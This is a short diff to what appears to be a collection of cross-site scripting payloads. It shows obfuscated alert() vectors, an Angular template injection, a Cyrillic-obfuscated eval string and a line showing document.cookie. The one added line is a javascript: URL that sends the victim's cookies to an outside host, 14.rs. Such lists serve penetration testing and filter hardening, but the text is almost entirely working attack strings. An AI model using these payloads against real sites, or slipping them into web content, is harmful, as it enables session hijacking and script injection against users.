@@ -18,6 +18,7 @@ javascript:var{a:onerror}={a:%2561lert};throw%20origin
 <img src="X" onerror=top[8680439..toString(30)](1337)>
 {{$on.constructor('alert(1)')()}}
 <script>top[8680439..toString(30)](1337)</script>
+javascript%3Alocation%2f**%2f=%27https://14.rs/?%27%2bdocument.cookie
 <input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 <a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
 <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA AAABCAIAAADj8JvFAAAAEElEQVRIDbXBAQEAAAABIP6Pz3/vD0E1BYAAAAAElFTkSuQmCC"  onerror="alert('1')">  
@@ -1745,3 +1746,4 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
